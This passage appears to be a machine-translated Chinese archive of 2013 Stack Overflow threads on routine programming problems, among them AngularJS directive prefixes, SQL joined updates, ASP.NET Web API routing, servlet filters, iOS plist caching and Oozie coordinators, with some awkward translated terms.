> 时间：2013-05-13T08:43:31.347

你只有它像一个方法。你应该有一个变量：

```
@OneToMany(cascade = CascadeType.ALL, mappedBy = "the relationship in the other class Ithink it could be for you parent", fetch = FetchType.LAZY, orphanRemoval=true)
public Set<MyChildObject> child= new HashSet<MyChildObject>(); 
```

你必须把它放在 show.jspx 中：

```
 <field:display field="child" id="your child id" object="${the class}" z="your chid z"/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-29T07:26:06.383

用这个

```
@OrderBy("orderingField asc") 
```

不要忘记

```
import javax.persistence.OrderBy; 
```

# angularjs - ng-app 和 data-ng-app 有什么区别？

> ID：16184428
> 
> 赞同：147
> 
> 时间：2013-04-24T05:59:32.153
> 
> 标签：angularjs, angularjs-directive

我已经开始了解 AngularJS，并且对`ng-app`和`data-ng-app`指令之间的区别感到困惑。

* * *

## 回答 #1

> 赞同：124
> 
> 时间：2013-11-07T03:15:50.383

这些答案中的大多数只是说*使模板有效 HTML*或*HTML Validator Compliant*，而没有解释这些术语的含义。

我不确定，但我猜这些术语适用于扫描您的代码以符合标准的 HTML 验证程序 - 有点像 lint。它们不识别`ng-app`为有效属性。他们希望非默认 HTML 属性以

`data-attribute_name_here`.

因此，创建者`AngularJS`为他们的指令创建了替代名称，包括`data-`在它们前面，以便 HTML 验证程序会“喜欢”它们。

* * *

## 回答 #2

> 赞同：41
> 
> 时间：2013-04-24T06:03:13.147

就运行时行为而言，它们只是不同风格的命名指令，如下所述：http: [//docs.angularjs.org/guide/directive](http://docs.angularjs.org/guide/directive)

> 指令具有驼峰式名称，例如 ngBind。可以通过使用这些特殊字符 :、- 或 _ 将驼峰式名称转换为蛇形大小写来调用该指令。可选地，该指令可以以 x- 或 data- 为前缀，以使其符合 HTML 验证器。以下是一些可能的指令名称的列表：ng:bind、ng-bind、ng_bind、x-ng-bind 和 data-ng-bind。

正如您在阅读本文中所看到的，`data-`可用于使您的 HTML 通过 HTML 验证器测试/

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-05-20T17:13:13.293

您可以声明角度命名空间`<html xmlns:ng="http://angularjs.org" ng-app>`

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2013-04-24T10:35:36.273

在现代浏览器中没有区别，但在较旧的 IE 中，除非您声明定义它的 XML 命名空间，否则它们将无法工作。

还有一个验证差异在于`ng-app`不是有效的 XHTML，并且会导致您的网页无法通过 HTML 验证。Angular 允许您在其指令前面加上`data-`或`x-`允许它进行验证。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2016-03-17T16:12:09.063

如果要使页面 HTML 有效，可以使用 data-ng- 而不是 ng-。
这**将**引发错误

```
<div ng-app="">

  <p>Input something in the input box:</p>
  <p>Name: <input type="text" ng-model="name"></p>
  <p ng-bind="name"></p>

</div> 
```

这**不会**抛出错误

```
<div data-ng-app="scope" data-ng-init="name='test'">

  <p>Input something in the input box:</p>
  <p>Name: <input type="text" data-ng-model="name"></p>
  <p data-ng-bind="name"></p>

</div> 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2017-04-04T11:54:29.553

这两个术语的基本区别在于 data-ng-app 验证 HTML 而后者不验证。功能保持不变。如需更多参考，您可以尝试 w3Validator。

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2016-07-07T07:51:20.997

两者之间绝对没有区别，除了某些 HTML5 验证器会在像 ng-app 这样的属性上抛出错误，但它们不会对任何以 data- 为前缀的东西抛出错误，比如 data-ng-app。所以在我们的角度指令中使用 data- 前缀是好的。

甚至你可以通过下面提到的方式使用角度指令 ng-bind, ng:bind, ng_bind, data-ng-bind, x-ng-bind

# sql - 使用 SQL 过程循环遍历行

> ID：16184430
> 
> 赞同：0
> 
> 时间：2013-04-24T05:59:33.163
> 
> 标签：sql, sql-server, sql-server-2008, sql-server-2005, stored-procedures

我有两个看起来像这样的表：

**Table1(ID, name, street, houseNo, DeliveryID)**和**Table2(ID, name street houseNo, DeliveryID)**

我想创建一个检查 Table1(name, street, houseNo) 和 Table2(name, street houseNo) 内容的过程。如果内容彼此相等，则应将 Table1.DeliveryID 插入 Table2.DelvieryID。

我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T06:02:21.423

请尝试使用内部联接更新（[带有内部联接的 SQL Server 更新](https://stackoverflow.com/questions/3468006/sql-server-update-with-inner-join)）：

```
UPDATE Table2
SET Table2.DelvieryID = Table1.DelvieryID
FROM Table2, Table1
WHERE 
    Table2.name = Table1.name AND
    Table2.street = Table1.street AND
    Table2.houseNo = Table1.houseNo 
```

要考虑 NULL 值，请尝试

```
UPDATE Table2
SET Table2.DelvieryID = Table1.DelvieryID
FROM Table2, Table1
WHERE 
    ISNULL(Table2.name, '') = ISNULL(Table1.name, '') AND
    ISNULL(Table2.street, '') = ISNULL(Table1.street, '') AND
    ISNULL(Table2.houseNo, '') = ISNULL(Table1.houseNo, '') 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-24T06:10:38.530

```
UPDATE Table2
SET Table2.DelvieryID = Table1.DelvieryID
FROM Table1 t1, Table2 t2
WHERE CHECKSUM(t1.name,t1.street,t1.houseNo)=CHECKSUM(t2.name,t2.street,t2.houseNo) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-24T06:16:09.550

简单的连接将起作用..

```
UPDATE tab2
SET tab2.DelvieryID = tab1.DelvieryID
FROM Table2 tab2, Table1 tab1
WHERE 
tab2.name = tab1.name AND
tab2.street = tab1.street AND
tab2.houseNo = tab1.houseNo 
```

# javascript - 如何从与原始数据相同的二进制数据中再现声音

> ID：16184432
> 
> 赞同：0
> 
> 时间：2013-04-24T05:59:40.307
> 
> 标签：javascript, html, audio

我使用此处提供的方法获得二进制数据，例如 -0.00005645725104856084 和 0.00000906579771242124（-1 到 1 范围）：[https ://gist.github.com/maxogden/3786030](https://gist.github.com/maxogden/3786030)

[然后我将它们发送到服务器以使用http://ncthhompson.com/blog/2013/01/07/you-dont-need-that-scriptprocessor/](http://ncthompson.com/blog/2013/01/07/you-dont-need-that-scriptprocessor/)提供的方法进行进一步处理，以重新生成与原始音调相同的声音另一端。

然而，我所能得到的只是震耳欲聋的白噪声和哇，啪！在 Chrome 上。我做错了吗？

任何人都知道应该让这个过程正常工作的任何方法或方法吗？

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-09T17:44:59.267

下面的项目证明了这是可能的：

```
http://agektmr.node-ninja.com:3000/ 
```

# cordova - 如何在手机 Gap 中从 JavaScript 发送邮件？

> ID：16184433
> 
> 赞同：0
> 
> 时间：2013-04-24T05:59:42.227
> 
> 标签：cordova, phonegap-plugins

伙计们，我正在处理电话间隙，我想添加发送邮件的功能。我想要的是当我发送邮件时，它会从设备中获取已经登录的邮件 ID，以及如何添加邮件到 ID。为我提供一些参考或一些代码，以便我可以利用这些资源。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:17:26.640

对于 iOS，请尝试此[https://github.com/phonegap/phonegap-plugins/tree/master/iPhone/EmailComposer](https://github.com/phonegap/phonegap-plugins/tree/master/iPhone/EmailComposer)，请参阅此链接以了解有关在 iOS 中检索登录邮件的信息 在 iOS[设备中获取默认用户电子邮件](https://stackoverflow.com/questions/10758431/get-default-user-email-in-ios-device)

# c# - Web api project routing trouble

> ID：16184437
> 
> 赞同：1
> 
> 时间：2013-04-24T05:59:54.027
> 
> 标签：c#, asp.net-web-api, routing, asp.net-mvc-routing, asp.net-web-api-routing

I have simple web API project (ASP.NET MVC). I need to deploy my project in the subfolder on the IIS. For example, I have the site `http://TestSite`/ and I need to deploy the project to `http://TestSite/MyProject/`. When I did it, web API routing stopped to work. Because my ajax call is routed to the main site - `http://TestSite/api/something/get`.

I have tried to update map routing in the next way:

```
routeTemplate: "MyProject/api/{controller}/{id}", 
```

But it doesn't affect as I want. What I am doing wrong and where can I read about some practices of web API control routing in ASP.NET MVC?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T08:58:24.073

这很简单。我不需要对路由做任何事情。我只需要更改 JavaScript 中的 url。

从：

```
$.getJSON('/api/Category', function (data) { 
```

至：

```
$.getJSON('api/Category', function (data) { 
```

只需删除 'api' 之前的 '/' 符号。意识到。

顺便说一句，关于调试 ASP.NET Web API 的好文章 -[使用 Route Debugger 调试 ASP.NET Web API](http://blogs.msdn.com/b/webdev/archive/2013/04/04/debugging-asp-net-web-api-with-route-debugger.aspx)

**编辑：**忘记我之前写的（而不是 BTW 部分）。这行不通。它适用于`http://TestSite/MyProject/`但不适用于`http://TestSite/MyProject/MyController/Index`. 我在过去的 ASP.NET MVC 项目中遇到了此类问题。我通过开始使用[Url helper](http://msdn.microsoft.com/en-us/library/system.web.mvc.urlhelper%28v=vs.108%29.aspx)解决了这个问题，例如：`@Url.Action("MyAction","MyController")`. 所以我需要类似 Web Api 的东西。我找到了。它是[UrlHelper.HttpRouteUrl](http://msdn.microsoft.com/en-us/library/jj128146%28v=vs.108%29.aspx)方法。现在我的代码如下：

```
$.getJSON( "@Url.HttpRouteUrl("DefaultApi",new {controller = "Category"})", function (data) { 
```

在哪里：

*   DefaultApi - 我的默认死记硬背的名称。
*   类别 - 我的 api 控制器的名称。

这个解决方案看起来并不优雅，但它确实有效。

# java - 从grails控制器中的地址栏中检索更改的url

> ID：16184438
> 
> 赞同：0
> 
> 时间：2013-04-24T05:59:58.943
> 
> 标签：java

在我用 grails 开发的网站中，我希望将搜索重定向到特定页面......在 url 映射中，我已经将各种搜索（如 grails 应用程序开发、移动应用程序开发）重定向到控制器内的操作......在该操作中，我想提取用户想要在我的网站中搜索 grails 应用程序开发时引用的完整 url...例如-http:/mysite.com/grails-application-developmemt... . 我想通过一些java方法或其他任何方法在我的控制器的操作中提取这个url，这样我就可以为我的网站启用特定的搜索功能

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T20:07:44.697

我不确定你真正在寻找什么。但我希望这可能会有所帮助。

如果你想要自定义 url 映射，那么你可以在**UrlMappings.groovy**上定义它：

```
"/$query?"(controller: "search", action: 'index', view: '/search') 
```

您的操作将收到名为“查询”的附加参数

```
class SearchController {
    def index(){
        String myquery = params.query
        .....
    }
} 
```

然后 url 看起来像：

```
http://yoursite.com/grails-application-developmemt 
```

# c# - Simple.Data InMemoryAdapter - FindAllByX(IEnumerable )

> ID：16184439
> 
> 赞同：1
> 
> 时间：2013-04-24T06:00:03.703
> 
> 标签：c#, simple.data

就像标题所说的那样，是否有某种方法可以使这个声明工作（使用 InMemoryAdapter）：

```
Database.Open().MySchema.MyTextResource.FindAllByX((IEnumerable<string>)myVariable); 
```

IT 现在返回 0 行，但如果我这样做

```
Database.Open().MySchema.MyTextResource.FindAllByX(((IEnumerable<string>)myVariable).First()); 
```

它返回 1，所以它匹配数据，它的 IEnumerable 部分搞砸了。

# c# - Persist form state from partial view after server validation error

> ID：16184444
> 
> 赞同：0
> 
> 时间：2013-04-24T06:00:21.150
> 
> 标签：c#, forms, asp.net-mvc-4

I think my question is a common scenario because I've been reading about these hours but to be honest I still have some doubts about it. I have a simple controller with these actions (as far as I understood this follows the PRG pattern)

```
public ActionResult Index()
{
    var partyId = (int) Session["PartyId"];
    var viewModel = _displayBuilder.Build(partyId);
    return View(viewModel);
}

[HttpGet]
public ActionResult AddDocument()
{
    var partyId = (int) Session["PartyId"];
    var viewModel = _createBuilder.Build(partyId);
    return PartialView("_AddDocument", viewModel);
}
[HttpPost]
public ActionResult AddDocument(AddDocumentViewModel viewModel)
{
    var partyId = (int)Session["PartyId"];
    if (ModelState.IsValid)
    {
        _documentsManager.AddDocument(viewModel, partyId);
        return RedirectToAction("Index");
    }
    var newViewModel = _createBuilder.Rebuild(viewModel, partyId);
    return PartialView("_AddDocument", newViewModel);
} 
```

And the Index view holds this inside it

```
<div id="addDocument">
    @{ Html.RenderAction("AddDocument"); }
</div> 
```

plus a list of documents.

Problem is when the server validation fails, as it displays only the partialview as it's stated in the post method. I would like to be able to display the index view but without losing the form state (including modelstate, I guess I could pass this in the TempData but anyway I would lose the field's values posted).

As far as I can think there are some things I can do.

1.  Put everything in the same view
2.  Do the opposite to what I'm doing and create the list of documents as the partial view.
3.  Create the form as an ajax one. Not really sure about this one.

Is there anything I'm missing?

I was thinking of keeping this page the less "clever" I could and thus avoiding ajax for the moment, I would definitely go for it if it's clear is the best solution though. I think with that I could still maintain the form in a partial view and reuse it for another views. I mean two partials, the view and the list for updating it, is this right?

Thanks

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:50:00.180

如果不使用 Ajax，我真的看不到任何解决方法，因为您将结果呈现为“新”页面。

我能真正想到的唯一方法是重新加载完整的“索引”以及部分视图，但在这种情况下，使用 ajax 会容易得多。

像这样的东西：

```
$.ajax({
    type: "POST",
    url: url,
    contentType: "application/json; charset=utf-8",
    data: data,
    dataType: "html",
    success: function (data) {
        $("#addDocument").html(data);
    }
}); 
```

而不是使用

```
@{ Html.RenderAction("AddDocument"); } 
```

利用

```
@Html.Partial("_AddDocument") 
```

希望这可以帮助。

# jquery - 通过 jQuery.post 以 jsonp 格式发送可变参数

> ID：16184447
> 
> 赞同：0
> 
> 时间：2013-04-24T06:00:24.447
> 
> 标签：jquery, json, parameters, parameter-passing, jquery-post

好的。我在下面有这个脚本，稍微修改一下就可以完美地发送我需要发布跨域样式的 4 个参数中的 3 个。我正在使用带有 jsonp 格式的 jQuery 的 post 方法来实现这一点。

我试图弄清楚如何将变量作为参数传递给该方法，并且我尝试了很多变化。谁能帮忙？我该怎么做呢？

```
<script type="text/javascript">
$(document).ready(function(){
var randomVariable = "Something That Changes in Other Functions";

$.post("urlWithDifferentDomain", {"PropertyWithVariableValue" : randomVariable,
"login":"moreInfo",
"x":1,
"y":2},

function(data){
alert(data.x + "," + data.y + " : " + data.message);
//do something with data here
},'jsonp'
);
});
</script> 
```

# java - 如何使用 s:if 比较 s:hidden 的值

> ID：16184449
> 
> 赞同：0
> 
> 时间：2013-04-24T06:00:31.010
> 
> 标签：java, javascript, jsp, struts2

我有 s: 像这样的隐藏标签...

```
<s:hidden name="hiddenpopup" value="0" id="hiddenpopup"/> 
```

我在 javascript 中设置 hiddenpopup 的值，如下所示：

```
document.getElementById("hiddenpopup").value=5; 
```

现在我想在 jsp 中比较 this 的值，我这样做：

```
<s:if test="%{#hiddenpopup==5}">
    <%@ include file="/planmanagement/planSummary/ConfirmationPopup.jsp" %>
    </s:if> 
```

这种比较方式是正确的还是我哪里错了？有人可以帮我吗？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:06:33.830

JSP 标记在服务器上进行处理，并在执行任何 javascript 之前在浏览器中呈现为 HTML。因此，您尝试做的事情是不可能的。如果您使用 javascript 更改输入字段的值，您还必须使用 javascript 进行检查，或者执行回发到服务器的操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-06T11:58:56.990

你不会得到它 s:if 将在页面加载时执行，但你设置值的函数只有在那之后才能工作

# azure - 在 Azure 移动服务中使用身份验证提供程序的问题

> ID：16184452
> 
> 赞同：1
> 
> 时间：2013-04-24T06:00:47.550
> 
> 标签：azure, azure-storage, azure-mobile-services

我正在尝试使用身份验证令牌登录 Azure 移动服务，但收到此错误：“身份验证令牌的签名格式错误或由不同的密钥签名。” 我使用 Facebook 作为身份验证提供者。

作为记录，我已经通过先登录获得了身份验证令牌。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-16T19:14:45.637

从“首先进行身份验证”到 Facebook 或其他社交网络收到的身份验证令牌可能与通过 Azure 移动服务向该网络进行身份验证获得的身份验证令牌不同。这就是为什么您的令牌将“由不同的密钥签名”的原因。就其价值而言，这与尝试使用从另一个使用社交登录的站点获取的令牌并在您的站点中使用它没有什么不同。您只能使用使用您的密钥签名的令牌。

# objective-c - 没有互联网时如何从tableView中的plist读取数据

> ID：16184455
> 
> 赞同：0
> 
> 时间：2013-04-24T06:00:55.137
> 
> 标签：objective-c, json, uitableview, plist

我从 json url 在 plist 中写入数组。我想在不存在时从 plist 获取数据，当存在时从 json url 获取数据

这是我的代码（我在 Document 文件夹应用程序中创建 plist 文件）：

```
#import "ViewController.h"
#define DOC_DIR [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0]

@implementation ViewController
{
    NSMutableArray *name;
    NSMutableData *data;
    NSString *listPath;
    NSMutableArray *array;
    NSArray *n;
    NSMutableArray *add;
}
@synthesize table;
-(NSString*)Dir
{
    return [NSSearchPathForDirectoriesInDomains(NSDocumentationDirectory, NSUserDomainMask, YES)objectAtIndex:0];
}
- (void)viewDidLoad
{
    [super viewDidLoad];
    [UIApplication sharedApplication].networkActivityIndicatorVisible = YES;
    NSURL *url = [NSURL URLWithString:@"http://myDomain.com/test.php"];
    NSURLRequest *request = [NSURLRequest requestWithURL:url];
    NSURLConnection *con = [[NSURLConnection alloc] initWithRequest:request delegate:self];
    [con start];

}

- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response
{
    data = [[NSMutableData alloc]init];
}

- (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)theData
{
    [data appendData:theData];
}

- (void)connectionDidFinishLoading:(NSURLConnection *)connection
{
    [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;
    name = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:nil];
    for (int i = 0; i < [name count]; i++) {

    NSIndexPath *indexPath = [self.table indexPathForSelectedRow];
    n = [[name objectAtIndex:(indexPath.row)+i]objectForKey:@"title"];
    if(!add){
        add = [NSMutableArray array];
    }
    [add addObject:n];
    }
    NSLog(@"add = %@",add);
    [table reloadData];
    [self WriteToPlist:add];
}
- (void)WriteToPlist:(NSArray*)dataArray
{
    NSDictionary *dic = [NSDictionary dictionaryWithObjectsAndKeys:dataArray,@"Name", nil];
    NSString *Path = [DOC_DIR stringByAppendingPathComponent:@"Plist.plist"];
    [dic writeToFile:Path atomically:YES];
    NSLog(@"Path : %@",Path);
} 
```

这段代码从 json 读取数据：

```
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    // Return the number of sections.
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    // Return the number of rows in the section.
    return [name count];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"cell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }
    cell.textLabel.text = [[name objectAtIndex:indexPath.row] objectForKey:@"title"];
//top code read data from json and I want when no internet read data from plist 
    return cell;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:23:26.647

```
// Path to the plist (in the application bundle)
NSString *path = [[NSBundle mainBundle] pathForResource:
    @"Plist" ofType:@"plist"];

// Build the array from the plist  
NSMutableArray *array2 = [[NSMutableArray alloc] initWithContentsOfFile:path];

// Show the string values  
for (NSString *str in array2)
  NSLog(@"--%@", str); 
```

您有数组，现在只需将值设置为数据源数组

```
[tableview reloadData]; 
```

要检查互联网连接，您可以使用[苹果提供的可达性类](http://developer.apple.com/library/ios/#samplecode/Reachability/Introduction/Intro.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T07:09:35.047

第 1 步：使用以下方法检查 Internet 是否已连接，执行此方法

```
- (BOOL) connectedToInternet
{
    NSURL *requestURL = [NSURL URLWithString:@"http://www.google.com"];
    NSData *data = [NSData dataWithContentsOfURL:requestURL];

    return ([data bytes]>0) ? YES : NO;
} 
```

或者

第 1 步：如果您知道的话，您还可以实施 Reachability Class 来检查 Apple 的 Internet 连接。

第 2 步：现在在调用 Web 服务请求之前检查您的方法中的连接性

```
if([self connectedToInternet])
{
    // Make a reqeust to server
    [UIApplication sharedApplication].networkActivityIndicatorVisible = YES;
    NSURL *url = [NSURL URLWithString:@"http://yourDomain.com/test.php"];
    NSURLRequest *request = [NSURLRequest requestWithURL:url];
    NSURLConnection *con = [[NSURLConnection alloc] initWithRequest:request delegate:self];
    [con start];
}
else
{
    // Write a Handy code to load Data from Your Local Plist
    // Path to plist From Documents Folder
    NSString *docFilePath = [DOC_DIR stringByAppendingPathComponent:@"Data.plist"];

    NSDictionary *dictData = [NSDictionary dictionaryWithContentsOfFile:docFilePath];

    NSLog(@"%@",dictData);
    // Reload your TableView
} 
```

# wso2 - 如何在 Vaadin 的 WSO2 弹性负载均衡器中启用粘性会话

> ID：16184456
> 
> 赞同：0
> 
> 时间：2013-04-24T06:00:55.477
> 
> 标签：wso2, load-balancing, vaadin, jsessionid

wso2 或 vaadin 人我按照本指南为 WSO2 应用程序服务器设置 ELB [http://docs.wso2.org/wiki/display/ELB203/Setup+ELB+with+WSO2+Application+Server](http://docs.wso2.org/wiki/display/ELB203/Setup+ELB+with+WSO2+Application+Server)

ELB 完美运行。但是，我的 vaadin 应用程序显示此错误。

```
Cookies disabled

This application requires cookies to function.
Please enable cookies in your browser and click here to try again. 
```

Vaadin 相关的提交链接。 [http://dev.vaadin.com/changeset/11570/svn](http://dev.vaadin.com/changeset/11570/svn)

这应该是与会话/cookie有关的一些问题。

如果需要，我愿意提供更多信息

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-02T09:33:41.980

事实证明，该错误已在 wso2 svn trunk 中修复，但未在最新的 ELB/ESB 中修复。我得到两个 JSESSIONID cookie，这就是直通代理失败的原因。希望它可以帮助某人。

见[https://wso2.org/jira/browse/ESBJAVA-1659](https://wso2.org/jira/browse/ESBJAVA-1659)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-01T02:18:40.960

请您尝试绕过 WSO2 ELB 访问您的应用程序并将流经应用程序的 http 标头发送给我们（在客户端和您的应用程序之间使用 TCPMon）？

仅供参考 WSO2 ELB 确实保留 JSESSIONID cookie。

# c# - 循环依赖和工厂方法的问题

> ID：16184460
> 
> 赞同：1
> 
> 时间：2013-04-24T06:01:27.327
> 
> 标签：c#, dependencies

我有一个用于创建具体对象的工厂库（项目），并且我有多个用于具体对象的库。

现在我想要一个具体的对象库来调用工厂库来获取另一个具体的对象。但由于循环依赖，我不能这样做。我正在使用 C#。

有什么解决办法吗？非常感谢帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:08:49.680

一个有用的解决方案是创建第三个项目，在其中放置指向其他两个的方法。

例如：

项目 A：工厂图书馆

项目 B：具体对象

项目 C（新的）：将使用项目 B 类和项目 A 库的方法。

通用：创建特定项目以拆分具有循环依赖关系的类。

希望能帮助到你。

更新：

X --> A --> B（实际）

**问题：**

B --> A（循环依赖）

**解决方案：**

从 B 调用的 A 的拆分部分到一个新项目 C（也必须从 X 指向）

X --> A --> B

X --> C

问题已解决：B --> C（无循环依赖）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:33:45.620

尝试界面设计。为此，请使用混凝土和工厂的接口。然后进行构造函数注入。您也可以进行属性注入，这取决于您，但恕我直言，构造函数注入更好。

**项目 A：具体对象和工厂的接口**

**然后你的具体对象，项目B，是引用项目A。**所有对象都是从A实现的接口，并且只在接口中接受参数。注入工厂而不是在具体对象中创建它。前任：

```
public class ConcreteObjectA : IConcreteObjectA{
  public ConcreteObjectA(IFactoryObjectB factoryB){
    factoryB.Create();
  }
} 
```

**然后你的工厂对象，项目C，是引用项目B。**所有工厂都在接口中实现，并且只返回接口。前任：

```
public class FactoryObjectB : IFactoryObjectB {
  public IConcreteObjectB Create(){
    return new ConcreteObjectB();
  }
} 
```

来自客户端的用法将是这样的：

```
public void CreateObjectA(){
  FactoryObjectB factory = new FactoryObjectB();
  ConcreteObjectA objectA = new ConcreteObjectA(factory);
} 
```

# redirect - 从一个 html 页面到另一个页面的自动隐藏重定向

> ID：16184470
> 
> 赞同：0
> 
> 时间：2013-04-24T06:02:27.380
> 
> 标签：redirect

我对网络编程很陌生。整个项目将两家商店联系在一起。

我们的一个拥有第一个 shob 的客户提供了某种事件 API，它在事件发生时向我们的一个简单的 html/js 文件发送请求（指定了不同的文件 - 例如，创建了一个新客户，需要商店数据库之间同步）。他的 GET 请求中包含一个 URL 作为参数。

我们必须解析这个给定的 URL，向这个 URL 发送请求并“读取”事件的实际内容（新客户的姓名等），将其写入我们的数据库并响应来自的初始请求其他商店（成功或失败）。

如何在不设置 Web 服务等的情况下在 html/js 文件中以简单的方式执行此操作？不要为数据库操作而烦恼，它已经处理好了..它关于自动重定向..

许多Thx ..

Ĵ

# java - 使 servlet 过滤器适用于 EAR 中的所有 Web 应用程序

> ID：16184479
> 
> 赞同：1
> 
> 时间：2013-04-24T06:03:20.130
> 
> 标签：java, jsp, glassfish, servlet-filters, servlets

我正在使用 JSP 和 Servlet 开发一个 Web 应用程序。

我为登录目的开发了一个 servlet 过滤器。它检查用户是否已登录，如果用户已登录，则它允许访问所请求的资源，否则它将请求重定向到登录页面。而且效果很好。

**Web.xml**

```
<filter>
    <filter-name>MyFilter</filter-name>
    <filter-class>com.myfilter.MyFilter</filter-class>
    <init-param>
        <param-name>PARAM_NAME_HERE</param-name>
        <param-value>PARAM_VALUES_HERE</param-value>
    </init-param>
</filter>

<filter-mapping>
    <filter-name>MyFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping> 
```

如果我将上面的代码放在`Tomcat` **Home-> conf-> Web.xml**中，那么过滤器适用于部署在 . 中的所有应用程序`Tomcat`。（这是我想在 Glassfish 中为 EAR 文件实现的）

但现在由于[某些原因](https://stackoverflow.com/q/16060390/1551233)，我决定转向 Glassfish。现在我创建了一个`EAR`包含两个应用程序（WAR）`1.Login`和`2\. Profiles`. 过滤器在`com.filter`包中，`Login Application`而包中不存在`Profiles`。

我的问题是我应该把上面的`XML`代码放在哪里，这将确保过滤器适用于所有应用程序（WAR）`EAR`？

**更新1**

如果我将上面的 XML 代码放在`defualt-web.xml`目录下，`glassfish\domains\domain1\config\`那么它适用于`Login`Applicaion，但不适用于`Profiles`同一`EAR`文件中的应用程序。

日志中有Error:
Exception starting filter MyFilterName java.lang.InstantiationException .....
. Caused by: java.lang.ClassNotFoundException: com.myfilter.MyFilterName

[注意：过滤器在`Login`应用程序（WAR）中，而不是在`Profiles`应用程序（WAR）中]

那么我应该如何使它适用于`Profiles`（EAR 中的所有 WAR）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T07:34:22.783

将包含过滤器的罐子放入`glassfish\domains\domain1\lib`文件夹

# maven - 访问 Ondemand Bamboo 实例的 Maven 存储库

> ID：16184481
> 
> 赞同：0
> 
> 时间：2013-04-24T06:03:40.913
> 
> 标签：maven, cloudbees, bamboo

我对设置 Ondemand Bamboo 实例有一些疑问/疑问。我有基于云的 Git 存储库。我想检查源代码，使用 Maven 3.x 构建我的项目并访问生成的 Maven 工件存储库。

问：Ondemand Bamboo 实例是否提供 maven 存储库访问？

[Cloubees](http://cloudbees.com/)提供了这个工具：它提供了一个基于 nexus 的 maven 中央代理和一个私有存储库。因此，对于 Cloudbees，开发人员必须指向托管在 CloudBees 位置[https://repository-myproject.forge.cloudbees.com/release的存储库](https://repository-myproject.forge.cloudbees.com/release)

问：Ondemand Bamboo 设置是否提供类似的功能？如果是，要访问 Maven 存储库，我是否需要将 Bamboo 的图像实例始终保持在“开始”模式？如果否，我如何将工件传输到本地托管的 Nexus 服务器？是否可以从 Bamboo 实例 FTP/上传到不同的服务器？

任何帮助/提示将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-18T06:13:09.133

在 cloudbees 上，设置了默认的 maven 配置，以便这些 maven 存储库默认可用，因此您无需配置任何东西。我不认为竹子以这种方式拥抱 Maven 构建过程

# ios - 如何在 iosopendev 中创建普通应用程序（无 Tweak）

> ID：16184482
> 
> 赞同：1
> 
> 时间：2013-04-24T06:03:41.117
> 
> 标签：ios, ios6, jailbreak, cydia

我正在尝试在 iosopendev 中创建一个具有单个视图的可可触摸项目，但可能在某个地方我做错了，因为该项目的图标在我的 iPhone 的应用程序列表中不可见。以下是我为创建一个而采取的步骤项目

1.  在 iosopendev 中选择可可触摸项目
2.  在 iosopendevdevice 中添加了我的设备的 IP 地址
3.  创建新目标添加 Xcode“单一视图”项目并在需要的任何地方选择“不编码符号”。
4.  为配置文件选择构建

该项目构建没有任何错误，我可以在 Cydia 中看到项目名称，但不知道如何打开它并查看我的应用程序的视图，请让我知道我哪里出错了。

我按照[这篇](https://stackoverflow.com/questions/9358317/xcode-project-conversion-to-iosopendev)文章创建应用程序并在架构中选择设备时收到此错误“目标指定产品类型'com.apple.product-type.application'，但'iphoneos'平台没有这样的产品类型”。

# oozie - 避免在 Oozie Coordinator 中指定结束时间

> ID：16184484
> 
> 赞同：4
> 
> 时间：2013-04-24T06:03:50.783
> 
> 标签：oozie, oozie-coordinator

在我的 oozie coordinator.xml 中，我不想指定结束时间。有没有办法做到这一点。

**协调器.xml**

```
 <coordinator-app name="MY_APP" frequency="60" start="2009-02-01T00:00Z" end="2009-02-02T00:00Z" timezone="UTC" xmlns="uri:oozie:coordinator:0.1">
    <action>
       <workflow>
          <app-path>hdfs://localhost:9000/tmp/workflows</app-path>
       </workflow>
    </action>     
 </coordinator-app> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T10:14:42.140

不。请指定遥远的将来的某个时间，例如“2109-02-02T00:00Z”。

# python - 在 ipdb shell 中使用 IPython 魔术函数

> ID：16184487
> 
> 赞同：26
> 
> 时间：2013-04-24T06:04:14.860
> 
